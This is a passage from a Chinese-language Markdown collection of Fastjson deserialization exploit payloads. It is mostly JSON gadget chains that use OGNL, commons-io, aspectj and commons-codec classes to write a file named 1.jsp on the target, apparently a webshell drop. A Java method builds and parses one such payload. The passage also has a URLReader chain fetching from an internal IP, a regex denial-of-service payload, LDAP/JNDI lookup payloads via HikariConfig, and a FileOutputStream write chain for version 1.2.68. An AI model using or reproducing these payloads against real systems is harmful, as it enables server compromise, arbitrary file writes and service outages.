"$ref":"$[3].su18.bOM.bytes"}},{"su22":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":{     "@type": "org.apache.commons.io.input.BOMInputStream",     "delegate": {       "@type": "org.apache.commons.io.input.ReaderInputStream",       "reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":{"@type":"java.lang.String"{"@type":"java.net.URL","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type": "java.lang.String""@type":"java.util.Locale","language":"http://192.168.66.136:1234/","country":{"@type":"java.lang.String"{"$ref":"115"}}}}},       "charsetName": "UTF-8",       "bufferSize": 1024},"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [1]}]}}}}},{"su23" : {"$ref":"$[5].su22.node.p.stream"}},{"su20":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":{     "@type": "org.apache.commons.io.input.BOMInputStream",     "delegate": {       "@type": "org.apache.commons.io.input.ReaderInputStream",       "reader":{"@type":"org.apache.commons.io.input.CharSequenceReader",
              "charSequence": {"@type": "java.lang.String"{"$ref":"$[4].su19"},"start": 0,"end": 0},       "charsetName": "UTF-8",       "bufferSize": 1024},"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [1]}]}}}}},{"su21" : {"$ref":"$[7].su20.node.p.stream"}}]
```

## ognl + io 写文件（链子有问题，还要调一下）
### cc低版本 2.0 -2.6
```xml
<dependency>  
    <groupId>ognl</groupId>  
    <artifactId>ognl</artifactId>  
    <version>3.2.21</version>  
</dependency>  
<dependency>  
    <groupId>commons-io</groupId>  
    <artifactId>commons-io</artifactId>  
    <version>2.2</version>  
</dependency>
```

```json
{
    "su14": {
        "@type": "java.lang.Exception",
        "@type": "ognl.OgnlException"
    },
    "su15": {
        "@type": "java.lang.Class",
        "val": {
            "@type": "com.alibaba.fastjson.JSONObject",
            {
                "@type": "java.lang.String"
                "@type": "ognl.OgnlException",
                "_evaluation": ""
            }
        },
        "su16": {
            "@type": "ognl.Evaluation",
            "node": {
                "@type": "ognl.ASTMethod",
                "p": {
                    "@type": "ognl.OgnlParser",
                    "stream": {
                        "@type": "org.apache.commons.io.input.BOMInputStream",
                        "delegate": {
                            "@type": "org.apache.commons.io.input.ReaderInputStream",
                            "reader": {
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
      "@type":"org.apache.commons.io.input.ReaderInputStream",
      "reader":{
        "@type":"org.apache.commons.io.input.CharSequenceReader",
        "charSequence":{"@type":"java.lang.String""test8200个a"
      },
      "charsetName":"UTF-8",
      "bufferSize":1024
    },
            "branch":{
      "@type":"org.apache.commons.io.output.WriterOutputStream",
      "writer":{
        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
        "file":"1.jsp",
        "encoding":"UTF-8",
        "append": false
      },
      "charsetName":"UTF-8",
      "bufferSize": 1024,
      "writeImmediately": true
    },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
                            "charsetName": "UTF-8",
                            "bufferSize": 1024
                        },
                        "boms": [{
                            "@type": "org.apache.commons.io.ByteOrderMark",
                            "charsetName": "UTF-8",
                            "bytes": [
                                36,82
                            ]
                        }]
                    }
                }
            }
        },
        "su17": {
            "@type": "ognl.Evaluation",
            "node": {
                "@type": "ognl.ASTMethod",
                "p": {
                    "@type": "ognl.OgnlParser",
                    "stream": {
                        "@type": "org.apache.commons.io.input.BOMInputStream",
                        "delegate": {
                            "@type": "org.apache.commons.io.input.ReaderInputStream",
                            "reader": {
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{"$ref": "$.su16.node.p.stream.delegate.reader.is.input"},
        "branch":{"$ref": "$.su16.node.p.stream.delegate.reader.is.branch"},
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
                            "charsetName": "UTF-8",
                            "bufferSize": 1024
                        },
                        "boms": [{
                            "@type": "org.apache.commons.io.ByteOrderMark",
                            "charsetName": "UTF-8",
                            "bytes": [
                                36,82
                            ]
                        }]
                    }
                }
            }
        },
        "su18": {
            "@type": "ognl.Evaluation",
            "node": {
                "@type": "ognl.ASTMethod",
                "p": {
                    "@type": "ognl.OgnlParser",
                    "stream": {
                        "@type": "org.apache.commons.io.input.BOMInputStream",
                        "delegate": {
                            "@type": "org.apache.commons.io.input.ReaderInputStream",
                            "reader": {
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{"$ref": "$.su16.node.p.stream.delegate.reader.is.input"},
        "branch":{"$ref": "$.su16.node.p.stream.delegate.reader.is.branch"},
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
                            "charsetName": "UTF-8",
                            "bufferSize": 1024
                        },
                        "boms": [{
                            "@type": "org.apache.commons.io.ByteOrderMark",
                            "charsetName": "UTF-8",
                            "bytes": [
                                36,82
                            ]
                        }]
                    }
                }
            }
        },
        "su19": {
            "@type": "ognl.Evaluation",
            "node": {
                "@type": "ognl.ASTMethod",
                "p": {
                    "@type": "ognl.OgnlParser",
                    "stream": {
                        "@type": "org.apache.commons.io.input.BOMInputStream",
                        "delegate": {
                            "@type": "org.apache.commons.io.input.ReaderInputStream",
                            "reader": {
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{"$ref": "$.su16.node.p.stream.delegate.reader.is.input"},
        "branch":{"$ref": "$.su16.node.p.stream.delegate.reader.is.branch"},
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
                            "charsetName": "UTF-8",
                            "bufferSize": 1024
                        },
                        "boms": [{
                            "@type": "org.apache.commons.io.ByteOrderMark",
                            "charsetName": "UTF-8",
                            "bytes": [
                                36,82
                            ]
                        }]
                    }
                }
            }
        }   
    }
```

### cc 高版本 2.7 2.8
```json
{
    "su14": {
        "@type": "java.lang.Exception",
        "@type": "ognl.OgnlException"
    },
    "su15": {
        "@type": "java.lang.Class",
        "val": {
            "@type": "com.alibaba.fastjson.JSONObject",
            {
                "@type": "java.lang.String"
                "@type": "ognl.OgnlException",
                "_evaluation": ""
            }
        },
        "su16": {
            "@type": "ognl.Evaluation",
            "node": {
                "@type": "ognl.ASTMethod",
                "p": {
                    "@type": "ognl.OgnlParser",
                    "stream": {
                        "@type": "org.apache.commons.io.input.BOMInputStream",
                        "delegate": {
                            "@type": "org.apache.commons.io.input.ReaderInputStream",
                            "reader": {
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "inputStream":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
      "@type":"org.apache.commons.io.input.ReaderInputStream",
      "reader":{
        "@type":"org.apache.commons.io.input.CharSequenceReader",
        "charSequence":{"@type":"java.lang.String""test8200个a",
        "start":0,
        "end":2147483647
      },
      "charsetName":"UTF-8",
      "bufferSize":1024
    },
            "branch":{
      "@type":"org.apache.commons.io.output.WriterOutputStream",
      "writer":{
        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
        "file":"1.jsp",
        "charsetName":"UTF-8",
        "append": false
      },
      "charsetName":"UTF-8",
      "bufferSize": 1024,
      "writeImmediately": true
    },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
                            "charsetName": "UTF-8",
                            "bufferSize": 1024
                        },
                        "boms": [{
                            "@type": "org.apache.commons.io.ByteOrderMark",
                            "charsetName": "UTF-8",
                            "bytes": [
                                36,82
                            ]
                        }]
                    }
                }
            }
        },
        "su17": {
            "@type": "ognl.Evaluation",
            "node": {
                "@type": "ognl.ASTMethod",
                "p": {
                    "@type": "ognl.OgnlParser",
                    "stream": {
                        "@type": "org.apache.commons.io.input.BOMInputStream",
                        "delegate": {
                            "@type": "org.apache.commons.io.input.ReaderInputStream",
                            "reader": {
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "inputStream":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{"$ref": "$.su16.node.p.stream.delegate.reader.inputStream.input"},
        "branch":{"$ref": "$.su16.node.p.stream.delegate.reader.inputStream.branch"},
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
                            "charsetName": "UTF-8",
                            "bufferSize": 1024
                        },
                        "boms": [{
                            "@type": "org.apache.commons.io.ByteOrderMark",
                            "charsetName": "UTF-8",
                            "bytes": [
                                36,82
                            ]
                        }]
                    }
                }
            }
        },
        "su18": {
            "@type": "ognl.Evaluation",
            "node": {
                "@type": "ognl.ASTMethod",
                "p": {
                    "@type": "ognl.OgnlParser",
                    "stream": {
                        "@type": "org.apache.commons.io.input.BOMInputStream",
                        "delegate": {
                            "@type": "org.apache.commons.io.input.ReaderInputStream",
                            "reader": {
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "inputStream":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{"$ref": "$.su16.node.p.stream.delegate.reader.inputStream.input"},
        "branch":{"$ref": "$.su16.node.p.stream.delegate.reader.inputStream.branch"},
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
                            "charsetName": "UTF-8",
                            "bufferSize": 1024
                        },
                        "boms": [{
                            "@type": "org.apache.commons.io.ByteOrderMark",
                            "charsetName": "UTF-8",
                            "bytes": [
                                36,82
                            ]
                        }]
                    }
                }
            }
        },
        "su19": {
            "@type": "ognl.Evaluation",
            "node": {
                "@type": "ognl.ASTMethod",
                "p": {
                    "@type": "ognl.OgnlParser",
                    "stream": {
                        "@type": "org.apache.commons.io.input.BOMInputStream",
                        "delegate": {
                            "@type": "org.apache.commons.io.input.ReaderInputStream",
                            "reader": {
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "inputStream":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{"$ref": "$.su16.node.p.stream.delegate.reader.inputStream.input"},
        "branch":{"$ref": "$.su16.node.p.stream.delegate.reader.inputStream.branch"},
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
                            "charsetName": "UTF-8",
                            "bufferSize": 1024
                        },
                        "boms": [{
                            "@type": "org.apache.commons.io.ByteOrderMark",
                            "charsetName": "UTF-8",
                            "bytes": [
                                36,82
                            ]
                        }]
                    }
                }
            }
        }    
    }
```

## ognl + io + aspectj + commons-codec 写文件
需要写入文件大于 8kb
```xml
<dependency>  
    <groupId>commons-codec</groupId>  
    <artifactId>commons-codec</artifactId>  
    <version>1.6</version>  
</dependency>

<dependency>  
    <groupId>commons-io</groupId>  
    <artifactId>commons-io</artifactId>  
    <version>2.2</version>  
</dependency>
<dependency>  
    <groupId>org.aspectj</groupId>  
    <artifactId>aspectjtools</artifactId>  
    <version>1.9.8</version>  
</dependency>
<dependency>  
    <groupId>ognl</groupId>  
    <artifactId>ognl</artifactId>  
    <version>3.2.21</version>  
</dependency>
```

```java
public void ognl_io_aspectj_code_write(){
        String str = "test";
        for (int i = 0; i < 8201; i++){
        str += "a";
        }

        byte[] sb = str.getBytes();
        String baseStr = Base64.getEncoder().encodeToString(sb);
        byte[] bytes = baseStr.getBytes();


        String payload = "\r\n"
        + "{\r\n"
        + "    \"su14\": {\r\n"
        + "       \"@type\": \"java.lang.Exception\",\r\n"
        + "       \"@type\": \"ognl.OgnlException\"\r\n"
        + "    },\r\n"
        + "    \"su15\": {\r\n"
        + "       \"@type\": \"java.lang.Class\",\r\n"
        + "       \"val\": {\r\n"
        + "          \"@type\": \"com.alibaba.fastjson.JSONObject\",\r\n"
        + "          {\r\n"
        + "             \"@type\": \"java.lang.String\"\r\n"
        + "             \"@type\": \"ognl.OgnlException\",\r\n"
        + "             \"_evaluation\": \"\"\r\n"
        + "          }\r\n"
        + "       },\r\n"
        + "       \"su16\": {\r\n"
        + "          \"@type\": \"ognl.Evaluation\",\r\n"
        + "          \"node\": {\r\n"
        + "             \"@type\": \"ognl.ASTMethod\",\r\n"
        + "             \"p\": {\r\n"
        + "                \"@type\": \"ognl.OgnlParser\",\r\n"
        + "                \"stream\": {\r\n"
        + "  \"@type\":\"org.apache.commons.io.input.BOMInputStream\",\r\n"
        + "  \"delegate\":{\r\n"
        + "    \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\r\n"
        + "    \"input\":{\r\n"
        + "      \"@type\": \"org.apache.commons.codec.binary.Base64InputStream\",\r\n"
        + "      \"in\":{\r\n"
        + "        \"@type\":\"org.apache.commons.io.input.CharSequenceInputStream\",\r\n"
        + "        \"charset\":\"utf-8\",\r\n"
        + "        \"bufferSize\": 1024,\r\n"
        + "        \"s\":{\"@type\":\"java.lang.String\"\""+baseStr+"\"\r\n"
        + "      },\r\n"
        + "      \"doEncode\":false,\r\n"
        + "      \"lineLength\":1024,\r\n"
        + "      \"lineSeparator\":\"5ZWKCg==\",\r\n"
        + "      \"decodingPolicy\":0\r\n"
        + "    },\r\n"
        + "    \"branch\":{\r\n"
        + "      \"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\",\r\n"
        + "      \"targetPath\":\"1.jsp\"\r\n"
        + "    },\r\n"
        + "    \"closeBranch\":true\r\n"
        + "  },\r\n"
        + "  \"include\":true,\r\n"
        + "  \"boms\":[{\r\n"
        + "                  \"@type\": \"org.apache.commons.io.ByteOrderMark\",\r\n"
        + "                  \"charsetName\": \"UTF-8\",\r\n"
        + "                  \"bytes\":"+Arrays.toString(bytes)+"\r\n"
        + "                }],\r\n"
        + "}\r\n"
        + "             }\r\n"
        + "          }\r\n"
        + "       },\r\n"
        + "       \"su17\": {\r\n"
        + "          \"$ref\": \"$.su16.node.p.stream\"\r\n"
        + "       },\r\n"
        + "       \"su18\": {\r\n"
        + "          \"$ref\": \"$.su17.bOM.bytes\"\r\n"
        + "       }\r\n"
        + "    }";
        System.out.println(payload);
        JSON.parseObject(payload);
        }
```





# 无@type利用
对于 Fastjson 1.2.36-1.2.62 的版本存在dos漏洞
https://b1ue.cn/archives/314.html
```json
{"regex":{"$ref":"$[blue rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']"},"blue":"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}

{"regex":{"$ref":"$[\blue = /\^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$/]"},"blue":"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}
```



# 待测试
1.2.68
```

{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://0.0.0.0"}
{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://0.0.0.0"}
```

1.2.68的写?
```
{
    'stream':
    {
        '@type':"java.lang.AutoCloseable",
        '@type':'java.io.FileOutputStream',
        'file':'temp',
        'append':false
    },
    'writer':
    {
        '@type':"java.lang.AutoCloseable",
        '@type':'org.apache.solr.common.util.FastOutputStream',
        'tempBuffer':'SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=',
        'sink':
        {
            '$ref':'$.stream'
        },
        'start':38
    },
    'close':
    {
        '@type':"java.lang.AutoCloseable",
        '@type':'org.iq80.snappy.SnappyOutputStream',
        'out':
        {
            '$ref':'$.writer'
        }
    }
}
```

